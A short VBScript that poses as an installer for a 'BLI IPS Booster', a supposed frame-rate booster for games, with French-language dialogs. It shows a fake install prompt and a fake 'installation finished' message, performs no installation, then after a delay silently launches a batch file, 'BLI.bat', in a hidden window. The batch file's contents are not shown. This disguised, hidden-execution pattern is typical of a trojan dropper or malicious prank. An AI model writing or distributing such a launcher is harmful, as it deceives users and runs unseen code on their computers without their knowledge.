X = MsgBox ("Bienvenue dans l'installateur du BLI IPS Booster pour tous les jeux. Souhaitez-vous procéder à l'installation ?", 4 +0, "BLI IPS Booster")
WScript.Sleep 10000
X = MsgBox ("Installation terminée, vous pouvez maintenant jouer sans aucunes pertes d'IPS !", 0 +0, "BLI IPS Booster")
WScript.Sleep 50000
Set oWShell = CreateObject("Wscript.Shell") 
oWShell.Run """BLI.bat""", 0, False 
Set oWSHell = Nothing